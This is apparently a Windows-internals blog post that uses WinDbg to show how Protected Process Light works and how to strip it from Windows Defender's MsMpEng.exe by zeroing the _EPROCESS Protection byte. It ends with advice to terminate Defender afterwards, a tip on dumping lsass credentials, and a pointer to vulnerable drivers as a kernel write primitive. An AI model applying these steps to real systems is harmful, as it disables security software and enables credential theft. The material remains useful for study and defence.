---
title: "Protected Process Light (PPL) — A WinDbg Deep Dive"
date: 2026-08-23
categories: [Windows Internals, Deep Dive]
tags: [ppl, protected-process, eprocess, kernel, windbg, defender]
---

Windows Defender, lsass, csrss — these processes cannot be opened or killed even by SYSTEM. The mechanism is called **Protected Process Light (PPL)**. This post takes the four WinDbg commands needed to strip PPL and fully explains what each one does and why it works.

---

## What Is a Protected Process?

When you call `OpenProcess` on a target, the kernel runs an access check. Normally that check is about privileges and DACLs — if you're SYSTEM, you win. But for protected processes there's a second gate before any of that: the kernel compares your process's **protection level** against the target's. If yours isn't high enough, the open fails immediately with `ACCESS_DENIED`, no further checks done.

This gate lives in `PsGrantedAccess` inside `NtOpenProcess`. It reads a single byte from the target's `_EPROCESS` structure — the `Protection` field — and makes the decision there. No user-mode code, no policy, no privilege can bypass it. The only way around it is to modify that byte directly in the kernel.

---

## The `_EPROCESS` Structure

![_EPROCESS key fields layout](/assets/images/ppl-eprocess-layout.svg)

Every running process is represented in the kernel by an `_EPROCESS` structure. It's a large (~0x900 byte) object that holds everything about a process: its PID, its token, its handle table, its virtual address space, its image name, and its protection level.

WinDbg can show you the layout of any kernel structure without needing a live address. Passing `0` as the address just queries the type:

```
dt nt!_EPROCESS 0
```

This dumps every field with its offset. The one we care about:

```
dt nt!_EPROCESS 0 Protection
```
```
nt!_EPROCESS
   +0x6fa Protection : _PS_PROTECTION
```

`+0x6fa` means the Protection field lives 1786 bytes into the `_EPROCESS` structure. This offset is **build-specific** — it shifts between Windows versions and even cumulative updates. Always query it on your specific target before using it.

---

## The Protection Byte — `_PS_PROTECTION`

![_PS_PROTECTION bitfield layout](/assets/images/ppl-protection-byte.svg)

`_PS_PROTECTION` is a one-byte bitfield. You can inspect its layout the same way:

```
dt nt!_PS_PROTECTION
```
```
nt!_PS_PROTECTION
   +0x000 Type   : Pos 0, 3 Bits
   +0x000 Audit  : Pos 3, 1 Bit
   +0x000 Signer : Pos 4, 4 Bits
```

One byte, three fields packed into it:

- **Type** (bits 2–0): The protection strength.
  - `0` = None (regular process)
  - `1` = ProtectedLight (PPL)
  - `2` = Protected (full PP — strongest)

- **Audit** (bit 3): Always `0` in practice. Reserved for auditing future violations.

- **Signer** (bits 7–4): The signing authority that vouches for this binary. Higher signer = higher trust. A PPL process can only open a target with the same or lower signer rank.

| Signer value | Identity | Example process |
|---|---|---|
| 0 | None | Regular processes |
| 3 | Antimalware | MsMpEng.exe, MpDefenderCore |
| 4 | Lsa | lsass.exe (when RunAsPPL is enabled) |
| 6 | WinTcb | csrss.exe, smss.exe, wininit.exe |

To read the full byte as a number: `(Signer << 4) | Type`. So MsMpEng has `(3 << 4) | 1 = 0x31`.

Why does zeroing the whole byte work? Because `Type = 0` means "not protected" regardless of the Signer value. The kernel checks Type first — if it's 0, the process gets no protection at all.

---

## Step 1 — Find the Process

```
!process 0 0 MsMpEng.exe
```

`!process` is a WinDbg extension that walks the kernel's `PsActiveProcessLinks` list — a circular linked list that connects every `_EPROCESS` in the system. The arguments mean:

- First `0` — search all processes (not just a specific address)
- Second `0` — minimal output (just the header, not full thread list)
- `MsMpEng.exe` — filter by image name

**Example output:**
```
PROCESS ffffd209`089a3080
    SessionId: 0  Cid: 0cac    Peb: 5cb8f37000  ParentCid: 02bc
    DirBase: 16108b002  ObjectTable: ffffe303d3e71b40  HandleCount: 803.
    Image: MsMpEng.exe
```

The address after `PROCESS` — `ffffd209089a3080` — is the kernel virtual address of MsMpEng's `_EPROCESS`. Save this. Every field access in the next steps is computed as `EPROCESS_base + field_offset`.

Note that the image name shown here comes from `EPROCESS.ImageFileName`, which is a 15-character array. Long names get truncated — `MpDefenderCoreService.exe` appears as `MpDefenderCore`. This is normal; the kernel stores only the short name.

---

## Step 2 — Find the Protection Field Offset

```
dt nt!_EPROCESS 0 Protection
```
```
nt!_EPROCESS
   +0x6fa Protection : _PS_PROTECTION
```

You already know from the section above that the field is `_PS_PROTECTION` — but this command tells you *where* it sits in memory on this specific build. The `0` trick (passing null as the address) is safe because you're asking WinDbg to describe the type layout, not read memory at that address.

On Windows 10 18363, it's `+0x6FA`. On a newer build it may be different. If you hardcode this offset into a tool and run it on the wrong build, you'll corrupt unrelated kernel memory.

---

## Step 3 — Read the Protection Level

Now use the EPROCESS address from Step 1 and the offset from Step 2:

```
dt nt!_PS_PROTECTION ffffd209`089a3080+0x6fa
```

WinDbg evaluates `ffffd209089a3080 + 0x6fa = ffffd209089a376a` and reads a byte there, interpreting it as `_PS_PROTECTION`:

```
nt!_PS_PROTECTION
   +0x000 Level  : 0x31 '1'
   +0x000 Type   : 0y001
   +0x000 Audit  : 0y0
   +0x000 Signer : 0y0011
```

WinDbg's `0y` prefix means binary. Reading it:
- `Type = 0y001 = 1` → ProtectedLight (PPL) ✓
- `Signer = 0y0011 = 3` → Antimalware ✓
- `Level = 0x31` → `(3 << 4) | 1 = 0x31` ✓

This confirms MsMpEng is running as PPL-Antimalware. lsass would show `0x41` if `RunAsPPL` is enabled, or `0x00` if not — many systems ship with lsass unprotected, in which case you can dump it from usermode with no kernel access required.

---

## Step 4 — Remove the Protection

```
eb ffffd209`089a3080+0x6fa 0
```

`eb` = **edit byte**. WinDbg computes the address, locates the physical page, and writes `0x00` directly to kernel memory. This is possible because the kernel debugger has a privileged connection to the target — it bypasses all normal access controls.

Writing `0` clears all three fields simultaneously:
- Type → 0 (None — no longer protected)
- Audit → 0
- Signer → 0

**Verify it worked:**

```
dt nt!_PS_PROTECTION ffffd209`089a3080+0x6fa
```
```
nt!_PS_PROTECTION
   +0x000 Level  : 0x0
   +0x000 Type   : 0y000
   +0x000 Signer : 0y0000
```

MsMpEng is now a completely ordinary process. Any usermode code running as SYSTEM (or even with `SeDebugPrivilege`) can now call `OpenProcess(PROCESS_TERMINATE, ...)` and succeed.

**Important:** Removing PPL does not stop Defender. It only removes the kernel barrier that prevented you from opening the process. You still have to terminate it yourself after unprotecting it.

---

## Protection Level Reference

![PS_PROTECTED_SIGNER all values and example processes](/assets/images/ppl-signer-values.svg)

| Process | Type | Signer | Byte | Notes |
|---------|------|--------|------|-------|
| MsMpEng.exe | PPL (1) | Antimalware (3) | `0x31` | Windows Defender scanner |
| MpDefenderCore | PPL (1) | Antimalware (3) | `0x31` | Truncated from MpDefenderCoreService.exe |
| lsass.exe | PPL (1) | Lsa (4) | `0x41` | Only if `RunAsPPL = 1` in registry |
| csrss.exe | PP (2) | WinTcb (6) | `0x62` | Full PP — stronger than PPL |
| smss.exe | PP (2) | WinTcb (6) | `0x62` | Full PP |
| Regular process | — | — | `0x00` | No protection |

> **lsass tip:** Before attempting any kernel manipulation to target lsass, run `dt nt!_PS_PROTECTION lsass_eprocess+0x6fa` first. If it shows `0x00` already, the system hasn't enabled RunAsPPL and you can dump lsass directly from usermode — no driver needed.

---

## Key Points

- PPL is a **single byte** in `_EPROCESS`. There is no complex policy engine — zeroing it is sufficient.
- The offset `+0x6FA` is build-specific. Always verify with `dt nt!_EPROCESS 0 Protection` on your target.
- `_PS_PROTECTION` packs two meaningful fields: **Type** (protection strength) and **Signer** (trust rank). The kernel checks both when deciding if one process can open another.
- WinDbg's `eb` command writes directly to kernel memory via the debugger's privileged channel. Without a debugger, you need an equivalent kernel write primitive — such as a vulnerable driver.
- Removing PPL drops the process to fully unprotected but does not terminate it. Kill it after.
